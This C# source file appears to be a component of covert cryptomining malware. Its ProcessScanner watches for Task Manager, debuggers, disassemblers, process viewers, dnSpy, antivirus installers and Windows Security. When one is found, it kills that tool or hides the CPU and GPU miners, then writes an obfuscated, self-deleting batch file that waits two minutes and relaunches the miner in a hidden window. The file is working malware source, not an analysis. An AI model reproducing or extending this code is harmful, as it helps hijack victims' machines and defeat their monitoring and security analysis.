using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public class ProcessHelper
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const int STANDARD_RIGHTS_REQUIRED = 0xF0000;
        private const int TOKEN_ASSIGN_PRIMARY = 0x1;
        private const int TOKEN_DUPLICATE = 0x2;
        private const int TOKEN_IMPERSONATE = 0x4;
        private const int TOKEN_QUERY = 0x8;
        private const int TOKEN_QUERY_SOURCE = 0x10;
        private const int TOKEN_ADJUST_GROUPS = 0x40;
        private const int TOKEN_ADJUST_PRIVILEGES = 0x20;
        private const int TOKEN_ADJUST_SESSIONID = 0x100;
        private const int TOKEN_ADJUST_DEFAULT = 0x80;
        private const int TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_DEFAULT);

        public static bool IsProcessOwnerAdmin(string processName)
        {
            Process proc = Process.GetProcessesByName(processName)[0];

            OpenProcessToken(proc.Handle, TOKEN_ALL_ACCESS, out IntPtr ph);

            WindowsIdentity iden = new WindowsIdentity(ph);

            bool result = false;

            foreach (IdentityReference role in iden.Groups)
            {
                if (role.IsValidTargetType(typeof(SecurityIdentifier)))
                {
                    SecurityIdentifier sid = role as SecurityIdentifier;

                    if (sid.IsWellKnown(WellKnownSidType.AccountAdministratorSid) || sid.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
                    {
                        result = true;
                        break;
                    }
                }
            }

            CloseHandle(ph);

            return result;
        }
    }
    class ProcessScanner
    {
        private static readonly HashSet<string> BadProcessnameList = new HashSet<string>();
        private static readonly HashSet<string> BadWindowTextList = new HashSet<string>();


        public static void RunEasy(string workdir, string bin)
        {
            try
            {
                if (EasyScan(true, workdir, bin) != 0)
                    Thread.Sleep(1000);
            }
            catch { }


        }


        public static void RunAgressive() // ProcessScanner.InstallRun();
        {

            try
            {
                if (ScanKill(true) != 0)
                    Thread.Sleep(1000);
            }
            catch { }


        }


        public static int EasyScan(bool KillProcess, string workdir, string bin)
        {
            var isBadProcess = 0;

            if (BadProcessnameList.Count == 0 && BadWindowTextList.Count == 0) Init();

            var processList = Process.GetProcesses();

            foreach (var process in processList)
                if (BadProcessnameList.Contains(process.ProcessName) ||
                    BadWindowTextList.Contains(process.MainWindowTitle))
                {
                    isBadProcess = 1;

                    if (KillProcess)
                        try
                        {
                            FileInfo workBin = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(workdir), bin + ".exe"));

                            if (File.Exists(Properties.CPU.Default.cpuBin))
                                foreach (Process p in Process.GetProcessesByName(Properties.CPU.Default.cpuProc))
                                {
                                    p.Kill();

                                }

                            if (File.Exists(Properties.GPU.Default.gpuBin))
                                foreach (Process p in Process.GetProcessesByName(Properties.GPU.Default.gpuProc))
                                {
                                    p.Kill();
                                }

                            string batch = Path.GetTempFileName() + ".bat";
                            using (StreamWriter sw = new StreamWriter(batch))
                            {
                                sw.WriteLine("@echo off");
                                sw.WriteLine("Set axq=N1dFQT2eMw0VxP39URfca8b46SZ5XHO7YWEGlojKyrLshgIzDJAitpmqCnkvuB");
                                sw.WriteLine("cls");
                                sw.WriteLine("@%axq:~7,1%%axq:~19,1%%axq:~44,1%%axq:~37,1% %axq:~37,1%%axq:~18,1%%axq:~18,1%");
                                sw.WriteLine("%axq:~52,1%%axq:~51,1%%axq:~54,1%%axq:~7,1%%axq:~37,1%%axq:~60,1%%axq:~52,1% %axq:~1,1%%axq:~6,1%%axq:~10,1% > %axq:~0,1%%axq:~16,1%%axq:~42,1%");
                                sw.WriteLine("CD " + Application.StartupPath);
                                sw.WriteLine("START " + "\"" + "\" " + "\"" + workBin.FullName + "\"");
                                sw.WriteLine("CD " + Path.GetTempPath());
                                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");


                            }

                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = batch,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });
                            Environment.Exit(0);
                        }
                        catch
                        {
                        }

                    break;
                }

            return isBadProcess;
        }


        private static int ScanKill(bool KillProcess)
        {
            var isBadProcess = 0;

            if (BadProcessnameList.Count == 0 && BadWindowTextList.Count == 0) Init();

            var processList = Process.GetProcesses();

            foreach (var process in processList)
                if (BadProcessnameList.Contains(process.ProcessName) ||
                    BadWindowTextList.Contains(process.MainWindowTitle))
                {
                    isBadProcess = 1;

                    if (KillProcess)
                        try
                        {
                            process.Kill();
                        }
                        catch
                        {
                        }

                    break;
                }

            return isBadProcess;
        }

        private static int Init()
        {
            if (BadProcessnameList.Count > 0 && BadWindowTextList.Count > 0) return 1;
            BadProcessnameList.Add("Taskmgr");
            BadProcessnameList.Add("taskmgr");
            BadProcessnameList.Add("ollydbg");
            BadProcessnameList.Add("ida");
            BadProcessnameList.Add("ida64");
            BadProcessnameList.Add("idag");
            BadProcessnameList.Add("idag64");
            BadProcessnameList.Add("idaw");
            BadProcessnameList.Add("idaw64");
            BadProcessnameList.Add("idaq");
            BadProcessnameList.Add("idaq64");
            BadProcessnameList.Add("idau");
            BadProcessnameList.Add("idau64");
            BadProcessnameList.Add("scylla");
            BadProcessnameList.Add("scylla_x64");
            BadProcessnameList.Add("scylla_x86");
            BadProcessnameList.Add("protection_id");
            BadProcessnameList.Add("x64dbg");
            BadProcessnameList.Add("x32dbg");
            BadProcessnameList.Add("windbg");
            BadProcessnameList.Add("reshacker");
            BadProcessnameList.Add("ImportREC");
            BadProcessnameList.Add("IMMUNITYDEBUGGER");
            BadProcessnameList.Add("MegaDumper");
            BadWindowTextList.Add("OLLYDBG");
            BadWindowTextList.Add("ida");
            BadWindowTextList.Add("disassembly");
            BadWindowTextList.Add("scylla");
            BadWindowTextList.Add("Debug");
            BadWindowTextList.Add("[CPU");
            BadWindowTextList.Add("Immunity");
            BadWindowTextList.Add("WinDbg");
            BadWindowTextList.Add("x32dbg");
            BadWindowTextList.Add("x64dbg");
            BadWindowTextList.Add("Import reconstructor");
            BadWindowTextList.Add("MegaDumper");
            BadWindowTextList.Add("MegaDumper 1.0 by CodeCracker / SnD");
            BadWindowTextList.Add("Process Explorer - Sysinternals: www.sysinternals.com [" + Environment.MachineName + @"\" + Environment.UserName + "]");
            BadWindowTextList.Add("Process Explorer");
            BadWindowTextList.Add("Process Hacker [" + Environment.MachineName + @"\" + Environment.UserName + "]");
            BadWindowTextList.Add("Process Hacker [" + Environment.MachineName + @"\" + Environment.UserName + "]" + " (Administrator)");
            BadWindowTextList.Add("JetBrains dotPeek");
            BadWindowTextList.Add("dnSpy");
            BadWindowTextList.Add("dnSpy v6.1.8 (64-bit, .NET)");
            BadWindowTextList.Add("AIDA64 Extreme");
            BadWindowTextList.Add("AIDA64 Extreme Edition");
            BadWindowTextList.Add("AIDA64 Extreme [ TRIAL VERSION ]");
            BadWindowTextList.Add("Dr.Web Curelt!");
            BadWindowTextList.Add("avast_free_antivirus_setup_online");
            BadWindowTextList.Add("Установка Avast Free Antivirus");
            BadWindowTextList.Add("Avast Free Antivirus Setup");
            BadWindowTextList.Add("eset_internet_security_live_installer");
            BadWindowTextList.Add("BootHelper");
            BadWindowTextList.Add("ESET Live Installer");
            BadWindowTextList.Add("Avast Antivirus Installer");
            BadWindowTextList.Add("CCleaner");
            BadWindowTextList.Add("CCleaner");
            BadWindowTextList.Add("mmc");
            BadWindowTextList.Add("Консоль управления (MMC)");
            BadWindowTextList.Add("Windows Security");
            BadWindowTextList.Add("Безопасность Windows");
            return 0;
        }
    }
}
